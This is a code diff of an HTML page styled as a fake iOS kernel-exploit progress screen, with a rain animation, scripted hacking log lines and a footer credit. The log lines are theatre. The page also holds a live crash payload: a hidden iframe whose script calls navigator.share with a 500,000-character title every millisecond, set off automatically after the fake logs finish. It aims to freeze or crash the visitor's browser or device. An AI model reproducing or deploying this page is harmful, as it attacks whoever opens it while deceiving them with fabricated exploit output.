@@ -8,8 +8,9 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
             margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
+            /* Возвращаем глубокий радиальный фон */
             background: radial-gradient(circle at center, #0a0a2e 0%, #050510 50%, #000000 100%);
-            color: white; overflow: hidden;
+            color: white; overflow: hidden; position: relative;
         }
 
         body::after {
@@ -21,9 +22,11 @@
         #rainCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
 
         .main-card {
-            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 38px; padding: 35px 25px;
-            width: 85%; max-width: 360px; text-align: center; box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
+            background: rgba(255, 255, 255, 0.03); 
+            backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 38px; 
+            padding: 35px 25px; width: 85%; max-width: 360px; text-align: center; 
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
             z-index: 10; position: relative;
         }
 
@@ -33,69 +36,141 @@
             font-family: 'SF Mono', monospace;
         }
 
+        .live-indicator { display: flex; align-items: center; gap: 5px; color: #32d74b; }
+        .dot { width: 4px; height: 4px; background: #32d74b; border-radius: 50%; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
         h1 {
             font-size: 1.7rem; font-weight: 800; text-transform: uppercase; letter-spacing: -0.8px;
-            margin: 0 0 5px 0; background: linear-gradient(to bottom, #fff, #a1a1a1);
+            margin: 0 0 5px 0; line-height: 1.1;
+            background: linear-gradient(to bottom, #ffffff 0%, #a1a1a1 100%);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
-        .patient-msg { font-size: 11px; color: #32d74b; margin-bottom: 20px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px;}
+        .patient-msg { 
+            font-size: 11px; color: #32d74b; margin-bottom: 20px; 
+            font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(50, 215, 75, 0.3);
+        }
 
         .progress-container { background: rgba(255, 255, 255, 0.05); border-radius: 10px; height: 4px; width: 100%; margin-bottom: 20px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); transition: width 0.4s linear; }
+        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); }
 
         #console {
             background: rgba(0, 0, 0, 0.6); border-radius: 22px; padding: 18px; height: 180px;
             font-family: 'SF Mono', monospace; font-size: 10px; color: #32d74b;
             text-align: left; overflow: hidden; border: 1px solid rgba(50, 215, 75, 0.05);
+            line-height: 1.5;
         }
 
         .line { margin-bottom: 4px; opacity: 0; animation: fadeIn 0.1s forwards; }
         @keyframes fadeIn { to { opacity: 1; } }
 
+        .footer-tag { margin-top: 20px; font-size: 9px; color: #222; }
         #panic-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; color: #fff; font-size: 7px; overflow: hidden; word-break: break-all;}
     </style>
 </head>
 <body>
     <canvas id="rainCanvas"></canvas>
+
     <div class="main-card">
-        <div class="status-header"><div>INJECTING...</div><div id="bitrate">0.0 MB/s</div></div>
+        <div class="status-header">
+            <div class="live-indicator"><div class="dot"></div> INJECTING</div>
+            <div id="bitrate">0.0 MB/s</div>
+        </div>
+        
         <h1>Exploiting Kernel</h1>
         <div class="patient-msg">Please be patient, do not close the browser</div>
+        
         <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
+        
         <div id="console"></div>
+
+        <div class="footer-tag">© 2026 Repo made by Vitya</div>
     </div>
+
     <div id="panic-screen"></div>
     <iframe id="respring-iframe" style="display:none"></iframe>
 
     <script>
-        // Дождь и статы
+        // ЛОГИКА ДОЖДЯ (из IMG_5102.jpg)
+        const canvas = document.getElementById('rainCanvas');
+        const ctx = canvas.getContext('2d');
+        let width, height, drops;
+
+        function initRain() {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+            drops = Array.from({length: Math.floor(width/12)}, () => ({
+                x: Math.random() * width, y: Math.random() * height,
+                len: Math.random() * 30 + 15, speed: Math.random() * 2 + 2, op: Math.random() * 0.12 + 0.05
+            }));
+        }
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
+            ctx.fillRect(0, 0, width, height);
+            ctx.strokeStyle = '#1ad2dc';
+            ctx.lineWidth = 1;
+            ctx.lineCap = 'round';
+            drops.forEach(d => {
+                ctx.globalAlpha = d.op;
+                ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.len); ctx.stroke();
+                d.y += d.speed; if (d.y > height) d.y = -d.len;
+            });
+            requestAnimationFrame(draw);
+        }
+
+        // ДИНАМИКА ТЕРМИНАЛА И БИТРЕЙТА
         setInterval(() => {
             document.getElementById('bitrate').innerText = (Math.random() * 20 + 5).toFixed(1) + " MB/s";
         }, 150);
 
-        const logs = ["> Handshake: SUCCESS", "> Bypassing PAC/PPL...", "> Found kernel base", "> Injecting shellcode...", "> Memory panic triggered"];
+        const logs = [
+            "> Verifying server handshake...",
+            "> Handshake: SUCCESS (AES-256)",
+            "> Initializing WebKit heap spray...",
+            "> Bypassing PAC/PPL protection...",
+            "> Found kernel base: 0xffffff800",
+            "> Crafting fake vtable object...",
+            "> Exploiting task_for_pid(0)...",
+            "> Kernel read/write primitive: OK",
+            "> Stage 2: Injecting shellcode...",
+            "> FATAL: KPP memory panic"
+        ];
+
         let barW = 0;
         const bar = document.getElementById('bar');
         const consoleEl = document.getElementById('console');
 
         const interval = setInterval(() => {
-            barW += 1.5; bar.style.width = Math.min(barW, 100) + "%";
-            if(barW >= 100) clearInterval(interval);
-        }, 60);
+            barW += 0.8;
+            bar.style.width = Math.min(barW, 100) + "%";
+            if (barW >= 100) clearInterval(interval);
+        }, 40);
 
         function startLogs(i) {
-            if(i < logs.length) {
-                const d = document.createElement('div'); d.className = 'line'; d.innerText = logs[i];
-                consoleEl.appendChild(d); setTimeout(() => startLogs(i+1), 800);
+            if (i < logs.length) {
+                const div = document.createElement('div');
+                div.className = 'line';
+                div.innerText = logs[i];
+                consoleEl.appendChild(div);
+                consoleEl.scrollTop = consoleEl.scrollHeight;
+                setTimeout(() => startLogs(i + 1), Math.random() * 600 + 300);
             } else {
-                setTimeout(() => {
-                    document.getElementById('panic-screen').style.display = 'block';
-                    document.getElementById('respring-iframe').srcdoc = "<html><body><script>setInterval(()=>navigator.share({title:'X'.repeat(500000)}),1)<\/script></body></html>";
-                }, 1000);
+                setTimeout(triggerPanic, 500);
             }
         }
-        startLogs(0);
+
+        function triggerPanic() {
+            document.getElementById('panic-screen').style.display = 'block';
+            document.getElementById('respring-iframe').srcdoc = "<html><body><script>setInterval(()=>navigator.share({title:'X'.repeat(500000)}),1)<\/script></body></html>";
+        }
+
+        window.addEventListener('resize', initRain);
+        initRain();
+        draw();
+        setTimeout(() => startLogs(0), 1000);
     </script>
 </body>
 </html>
